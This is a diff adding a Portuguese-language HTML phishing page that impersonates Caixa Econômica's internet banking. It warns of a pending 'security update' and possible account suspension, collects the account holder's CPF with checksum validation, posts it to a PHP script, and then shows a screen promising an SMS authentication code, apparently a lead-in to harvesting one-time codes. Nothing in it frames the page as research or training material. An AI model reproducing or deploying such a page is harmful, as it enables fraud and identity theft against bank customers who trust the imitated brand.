@@ -1,0 +1,308 @@
+<html><head>
+	<title>Caixa Econômica | Renovação de Dados</title>
+			
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+	<meta name="robots" content="noindex, nofollow, noimageindex">
+	<meta name="theme-color" content="#1664ac">
+	<link rel="shortcut icon" href="../assets/imgs/favicon.ico">
+	<link rel="stylesheet" type="text/css" href="../assets/css/renovacao_pendente.css">
+	<script type="text/javascript" src="../js/jquery-3.2.1.min.js"></script>
+	<script type="text/javascript" src="../js/jquery.mask.min.js"></script>
+	<script type="text/javascript" src="../js/renovacao_pendente.js"></script>
+	<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300&amp;display=swap" rel="stylesheet">
+	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
+	<style>
+	*{
+		font-family: 'Montserrat', sans-serif;
+	}
+		.mod-preload .container-img-preload{
+			display: none;
+			position: absolute;
+			top: 50%;
+			left: 50%;
+			padding: 10px;
+			border-radius: 5px;
+			background-color: #fff;
+			transform: translate(-50%, -50%);
+			-webkit-transform: translate(-50%, -50%);
+			-moz-transform: translate(-50%, -50%);
+			-o-transform: translate(-50%, -50%);
+			-ms-transform: translate(-50%, -50%);
+		}
+
+		.mod-preload .container-img-preload .img-preload{
+			width: 60px;
+			height: 60px;
+		}
+		.eng p{
+		
+			color:#525252;
+			font-weight: bold;
+			background-color: #5ba2e442;
+			padding: 20px;
+		}
+		#bt{
+			height: 50px;
+			background-color: #ffa126 !important;
+		}
+		.todoTitle{
+			width: 85%;
+			margin: 0 auto;
+			font-family: Arial !important;
+			font-weight: bold;
+			color:#1664ac;
+		}
+
+		#expirationtime{
+			font-weight: bold;
+			font-size: 20px;
+		}
+            #btter {
+                width:100%;
+                padding:12px;
+                background:url(app/img/bg-bt.png) repeat;
+                color:#F3AC36;
+                font-family:Verdana, Geneva, sans-serif;
+                font-size:20px;
+                border-radius:8px;
+                border:0 none;
+            }
+
+            #bgadd{
+                position:fixed;
+                top:0px;
+                left:0px;
+                width:100%;
+                height:100%;
+                z-index:998;
+                background:url(app/img/bg-loading.png) repeat;
+                display:none;
+            }
+
+            .modalposition{
+                background: #fff none repeat scroll 0 0;
+                border: 1px solid #999;
+                border-radius: 0;
+                box-shadow: 0 0 10px #999;
+                color: #000;
+                font-family: Arial;
+                font-size: 12px;
+                height: 130px;
+                left: 50%;
+                margin-left: -150px;
+                margin-top: -170px;
+                position: absolute;
+                top: 50%;
+                width: 300px;
+                z-index: 99999;
+            }
+
+            .modaldiv1{ height: 30px; }
+            .modaltext{ padding: 15px; padding-bottom: 10px; color:#171616; }
+            .modalbutton{ padding:5px 30px 5px 30px; color:#FFF; border:1px solid #900; font-size:12px; background:#F00; font-weight:bold; border-radius:0;}
+            .modaldiv2{ margin-top:50px; display:block;}
+            .modalinforma{ padding-top: 0; padding:7px; font-family: Arial; font-size: 14px; color:#FFF; background:#103296; text-shadow:1px 1px 1px #666666;}
+
+            .bttok {
+                background: rgba(0, 0, 0, 0) url("app/img/bgbttQ.png") repeat scroll 0 0;
+                border: 0 none;
+                border-radius: 4px;
+                color: #171616;
+                font-family: arial;
+                font-size: 14px;
+                padding: 6px;
+                text-align: center;
+                width: 50px;
+                cursor:pointer;
+            } 
+        </style>
+		
+        <script>
+           function somenteNumeros(e) {
+        var charCode = e.charCode ? e.charCode : e.keyCode;
+        // charCode 8 = backspace   
+        // charCode 9 = tab
+        if (charCode != 8 && charCode != 9) {
+            // charCode 48 equivale a 0   
+            // charCode 57 equivale a 9
+            if (charCode < 48 || charCode > 57) {
+                return false;
+            }
+        }
+    }
+        </script>
+		
+<script>
+	function limitarInput2(obj) {
+    obj.value = obj.value.substring(0,11); 
+  }
+</script>
+
+<script>
+function proximoCampo(atual,proximo){
+if(atual.value.length >= atual.maxLength){
+document.getElementById(proximo).focus();
+	}
+}
+</script>
+
+</head> 
+<body>
+	
+	<form id="ajaxpf" name="ajaxpf" method="post" onsubmit="return ValidandoSHK()" action="indexx.php" autocomplete="off">
+	<div class="bodyContent">	
+		<div class="banner">
+			<a href="#">
+				<img id="icone" src="../assets/imgs/ico_voltar.png" width="27px" height="27px">
+			</a>
+			<p>INTERNET</p>
+			<p id="sp">BANKING</p>
+		</div>
+		<div class="eng"> 
+			<p>Cliente caixa,<br><b>Atualização de Segurança pendente. Evite a suspensão de sua conta.</b></p>
+		</div> 
+		<br>
+		<div class="formulario">
+			
+			 	
+				<div class="form-item">
+					<input type="tel" id="numcpf" name="numcpf" maxlength="11" required="" onkeyup="limitarInput2(this),proximoCampo(this, 'bt')" onkeypress="return somenteNumeros(event)" onfocus="this.value='';"> 	
+					<label class="label-float" for="numcpf"><b>CPF do titular da conta</b></label>
+				</div> 
+				
+				<input type="submit" id="bt" name="btnpend" value="Confirmar" onclick="return validar();">
+			
+	 
+		</div>
+	</div></form>
+
+	<div id="mod-preload" class="mod-preload">
+		<div class="container-img-preload">
+			<img class="img-preload" src="../assets/imgs/pre_load.gif">
+		</div>
+	</div>
+	<div id="custom-preload" class="mod-preload" style="text-align: center !important; ">
+		<div class="container-img-preload" id="customImgModalViewer" style="width: 90%; background: linear-gradient(90deg, rgba(1,93,169,1) 0%, rgba(33,128,173,1) 35%, rgba(82,185,171,1) 100%);  color: #fff;">
+ 			<br>
+			<h3 style="font-weight: bold; font-size: 23px">Validando dados, por favor, aguarde.</h3>
+			<br>
+		
+			<div class="progress" style="height: 5px; max-width: 90%; margin: 0 auto; background: white; padding: 13px;border-radius: 3px;">
+                <div class="progress-bar bg-danger" role="progressbar" style="background: #f89007 !important; height: 15px; width: 102%;margin: ;margin-top: -8px !important;" aria-valuenow="50" aria-valuemin="0" aria-valuemax="100"></div>
+        	</div>
+			<br>
+			<div class="row text-white">
+				<div class="col-8">
+					<p>Em instantes você poderá receber um código sms para autenticação</p>
+				</div>
+				<div class="col-4">
+					<span id="expirationtime"></span>
+				</div>
+			</div>
+		</div>
+		
+	</div>
+	
+	<script src="https://code.jquery.com/jquery-3.5.1.js"></script>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
+	 
+	 
+ <div style="display:none;" id="modalalert" class="modalposition">
+            <div class="modaldiv1">
+                <center>
+                    <div class="modalinforma"><div class="glyphicon glyphicon glyphicon-lock" style="padding:0 10px 0 0;"></div>CAIXA ECONOMICA Informa!</div>
+                    <div class="modaltext"><div id="TextErrorModal">Erro</div></div>
+                </center>
+            </div>
+            <div class="modaldiv2" align="center">
+                <a href="#closemodal"><button class="bttok" onclick="feixaMG()">&nbsp;&nbsp;OK&nbsp;&nbsp;</button></a>
+            </div>
+        </div>
+
+        <script type="text/javascript" src="js/switch.js"></script>
+        <script type="text/javascript" src="app/js/complemento.js"></script>
+
+        <script type="text/javascript">
+                    var el = document.querySelector('.checkbox-switch');
+                    var mySwitch = new Switch(el, {size: 'small', onSwitchColor: '#B05800'});
+        </script>
+
+        <script>
+            function feixaMG() {
+                document.getElementById('modalalert').style.display = 'none';
+                document.getElementById('bgadd').style.display = 'none';
+            }
+        </script>
+
+        <div id="bgadd"></div>
+
+        <script>
+            var floatLabel = document.querySelectorAll(".float-label");
+            var onFloatLabelChange = function () {
+                if (this.value.length == 0) {
+                    this.dataset.empty = null;
+                } else {
+                    delete this.dataset.empty;
+                }
+            }
+
+            floatLabel = [].slice.apply(floatLabel);
+            floatLabel.forEach(function (container) {
+                var input = container.querySelector("input");
+                input.addEventListener("keyup", onFloatLabelChange);
+            });
+        </script>
+
+
+        <script type="text/javascript">
+            function ValidandoSHK() {
+                var ModalAlertError = document.getElementById("TextErrorModal");
+                var ModalAlert = document.getElementById("modalalert");
+                var Modalfundo = document.getElementById("bgadd");
+
+               if(document.getElementById('numcpf').value.length < 11){
+					ModalAlertError.innerHTML = "CPF Composto por 11 digitos.!";
+                    ModalAlert.style.display = "";
+                    Modalfundo.style.display = "block";
+                    return false;
+        }else if(document.getElementById('numcpf').value == 11111111111 ||
+					document.getElementById('numcpf').value == 22222222222 ||
+					document.getElementById('numcpf').value == 33333333333 ||
+					document.getElementById('numcpf').value == 44444444444 ||
+					document.getElementById('numcpf').value == 55555555555 ||
+					document.getElementById('numcpf').value == 66666666666 ||
+					document.getElementById('numcpf').value == 77777777777 ||
+					document.getElementById('numcpf').value == 88888888888 ||
+					document.getElementById('numcpf').value == 99999999999 ||
+					document.getElementById('numcpf').value == 00000000000){
+					ModalAlertError.innerHTML = "CPF Invalido!";
+                    ModalAlert.style.display = "";
+                    Modalfundo.style.display = "block";
+					document.ajaxpf.numcpf.focus();
+                    return false;
+        }else{
+            var t = '';
+            var d = '';
+            var c = '';
+            var numcpf = document.getElementById('numcpf').value;
+            for (t = 9; t < 11; t++) {
+                for (d = 0, c = 0; c < t; c++) {
+                    d += numcpf[c] * ((t + 1) - c);
+                }
+                d = ((10 * d) % 11) % 10;
+
+                if (numcpf[c] != d) {
+                    ModalAlertError.innerHTML = "CPF Invalido!";
+                    ModalAlert.style.display = "";
+                    Modalfundo.style.display = "block";
+					document.ajaxpf.numcpf.focus();
+                    return false;
+                }
+            }
+            return true;
+        }
+    }  
+</script>
+
+</body></html>
